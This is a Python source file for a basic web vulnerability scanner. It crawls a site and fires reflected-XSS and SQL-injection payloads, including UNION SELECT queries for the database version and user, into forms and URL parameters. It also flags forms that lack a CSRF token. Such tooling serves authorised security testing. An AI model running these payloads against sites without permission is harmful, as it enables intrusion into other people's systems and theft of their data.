# scanner.py
import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

class VulnerabilityScanner:
    def __init__(self):
        self.session = requests.Session()
        self.vulnerabilities = []
        self.scanned_urls = set()
        self.base_url = None
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "\"<script>alert('XSS')</script>",
            "'<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "data:text/html,<script>alert('XSS')</script>"
        ]
        self.sqli_payloads = [
            "' OR 1=1--",
            "\" OR 1=1--",
            "admin'--",
            "admin' OR '1'='1",
            "1 UNION SELECT NULL, NULL, NULL--",
            "1' UNION SELECT @@version, USER(), DATABASE() -- "
        ]
        # Common SQL error messages for detection
        self.sqli_error_patterns = [
            r"SQL syntax", r"mysql_fetch_array()", r"Warning: mysql_",
            r"unclosed quotation mark", r"ODBC Microsoft Access Driver",
            r"DB2 SQL error", r"Oracle error", r"ORA-00900",
            r"PostgreSQL error", r"SQLite error"
        ]
        self.csrf_detection_pattern = r"(?i)<input[^>]+name=['\"]?_csrf_token['\"]?|X-CSRF-Token" # Heuristic for CSRF token presence

    def _log_vulnerability(self, type, severity, url, evidence, method="N/A", payload="N/A"):
        """Logs a discovered vulnerability."""
        self.vulnerabilities.append({
            'type': type,
            'severity': severity,
            'url': url,
            'method': method,
            'payload': payload,
            'evidence': evidence
        })
        print(f"[+] VULNERABILITY FOUND: {type} at {url} (Severity: {severity})")
        print(f"    Evidence: {evidence}")
        if payload != "N/A":
             print(f"    Payload: {payload}")

    def _is_same_domain(self, url):
        """Checks if the URL belongs to the same domain as the base URL."""
        return urlparse(url).netloc == urlparse(self.base_url).netloc

    def _get_all_forms(self, soup, url):
        """Extracts all forms from a BeautifulSoup object."""
        forms = []
        for form in soup.find_all("form"):
            action = form.get("action")
            method = form.get("method", "get").lower()
            target_url = urljoin(url, action)

            inputs = []
            for input_tag in form.find_all(["input", "textarea", "select"]):
                input_name = input_tag.get("name")
                input_type = input_tag.get("type", "text")
                input_value = input_tag.get("value", "")
                inputs.append({
                    "name": input_name,
                    "type": input_type,
                    "value": input_value
                })
            forms.append({"action": target_url, "method": method, "inputs": inputs})
        return forms

    def _get_all_links(self, soup, url):
        """Extracts all internal links from a BeautifulSoup object."""
        links = []
        for a_tag in soup.find_all("a", href=True):
            href = a_tag.get("href")
            link = urljoin(url, href)
            if self._is_same_domain(link) and link not in self.scanned_urls:
                links.append(link)
        return links

    def _check_xss(self, url, response_text, payload):
        """Checks for reflected XSS payloads in the response."""
        if payload in response_text:
            self._log_vulnerability("Reflected XSS", "High", url,
                                    f"Payload '{payload}' reflected in response.",
                                    method="GET/POST", payload=payload)

    def _check_sqli(self, url, response_text, payload):
        """Checks for common SQL error messages in the response."""
        for pattern in self.sqli_error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                self._log_vulnerability("SQL Injection", "High", url,
                                        f"SQL error pattern '{pattern}' found in response.",
                                        method="GET/POST", payload=payload)
                break # Log only one error per vulnerability type

    def _check_csrf(self, url, form_inputs):
        """Heuristically checks for the absence of CSRF tokens in forms."""
        # This is a heuristic. A more robust check involves submitting without token.
        has_csrf_token = False
        for input_field in form_inputs:
            if input_field.get("type") == "hidden" and re.search(self.csrf_detection_pattern, input_field.get("name", "")):
                has_csrf_token = True
                break
        
        if not has_csrf_token:
            self._log_vulnerability("CSRF (Potential)", "Medium", url,
                                    "No apparent CSRF token found in form.",
                                    method="POST")

    def _submit_form(self, form, url):
        """Submits a form with various payloads."""
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]

        data = {}
        for input_field in inputs:
            if input_field["type"] != "submit":
                data[input_field["name"]] = input_field["value"]

        # CSRF Check for forms
        self._check_csrf(url, inputs) # Check original form structure

        # Inject XSS payloads
        for payload in self.xss_payloads:
            payload_data = data.copy()
            for input_field in inputs:
                if input_field["type"] == "text" or input_field["type"] == "search":
                    payload_data[input_field["name"]] = payload
            
            try:
                if method == "post":
                    resp = self.session.post(action, data=payload_data, timeout=10)
                else: # GET
                    resp = self.session.get(action, params=payload_data, timeout=10)
                self._check_xss(action, resp.text, payload)
            except requests.exceptions.RequestException as e:
                print(f"[-] Request error during XSS test on {action}: {e}")

        # Inject SQLi payloads
        for payload in self.sqli_payloads:
            payload_data = data.copy()
            for input_field in inputs:
                # Only inject into fields that typically interact with a database
                if input_field["type"] in ["text", "search", "password"]: # Password field could also be vulnerable
                    payload_data[input_field["name"]] = payload
            
            try:
                if method == "post":
                    resp = self.session.post(action, data=payload_data, timeout=10)
                else: # GET
                    resp = self.session.get(action, params=payload_data, timeout=10)
                self._check_sqli(action, resp.text, payload)
            except requests.exceptions.RequestException as e:
                print(f"[-] Request error during SQLi test on {action}: {e}")

    def scan_url(self, url, depth=1):
        """Starts the scanning process."""
        self.base_url = url
        self.vulnerabilities = []
        self.scanned_urls = set()
        self._crawl(url, current_depth=0, max_depth=depth)
        return self.vulnerabilities

    def _crawl(self, url, current_depth, max_depth):
        """Recursively crawls URLs and scans for vulnerabilities."""
        if current_depth > max_depth or url in self.scanned_urls:
            return

        print(f"[!] Crawling and scanning: {url} (Depth: {current_depth})")
        self.scanned_urls.add(url)

        try:
            response = self.session.get(url, timeout=10)
            response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
        except requests.exceptions.RequestException as e:
            print(f"[-] Error accessing {url}: {e}")
            return

        soup = BeautifulSoup(response.text, "html.parser")

        # Scan for vulnerabilities in GET parameters (initial page and links)
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        for param, values in query_params.items():
            for value in values:
                # XSS in GET parameters
                for xss_payload in self.xss_payloads:
                    test_params_xss = query_params.copy()
                    test_params_xss[param] = xss_payload
                    new_url_xss = parsed_url._replace(query=urlencode(test_params_xss, doseq=True)).geturl()
                    try:
                        resp_xss = self.session.get(new_url_xss, timeout=10)
                        self._check_xss(new_url_xss, resp_xss.text, xss_payload)
                    except requests.exceptions.RequestException as e:
                        print(f"[-] Request error during GET XSS test on {new_url_xss}: {e}")

                # SQLi in GET parameters
                for sqli_payload in self.sqli_payloads:
                    test_params_sqli = query_params.copy()
                    test_params_sqli[param] = sqli_payload
                    new_url_sqli = parsed_url._replace(query=urlencode(test_params_sqli, doseq=True)).geturl()
                    try:
                        resp_sqli = self.session.get(new_url_sqli, timeout=10)
                        self._check_sqli(new_url_sqli, resp_sqli.text, sqli_payload)
                    except requests.exceptions.RequestException as e:
                        print(f"[-] Request error during GET SQLi test on {new_url_sqli}: {e}")

        # Scan forms
        forms = self._get_all_forms(soup, url)
        for form in forms:
            self._submit_form(form, url)

        # Crawl links
        links = self._get_all_links(soup, url)
        for link in links:
            self._crawl(link, current_depth + 1, max_depth)

# Example usage (for testing scanner.py directly)
if __name__ == '__main__':
    scanner = VulnerabilityScanner()
    # Target a known vulnerable application for testing
    # Example: A simple test PHP script reflecting GET parameters without sanitization
    # or a known SQLi vulnerable login page.
    # Replace with a URL you have permission to scan!
    target_url = "http://testphp.vulnweb.com/index.php?cat=1" # Example target
    print(f"[*] Starting scan for: {target_url}")
    results = scanner.scan_url(target_url, depth=0) # Set depth to 0 for single page scan

    if results:
        print("\n--- Scan Results ---")
        for vuln in results:
            print(f"Type: {vuln['type']}, Severity: {vuln['severity']}")
            print(f"  URL: {vuln['url']}")
            print(f"  Method: {vuln['method']}")
            print(f"  Payload: {vuln['payload']}")
            print(f"  Evidence: {vuln['evidence']}\n")
    else:
        print("\n--- No vulnerabilities found ---")

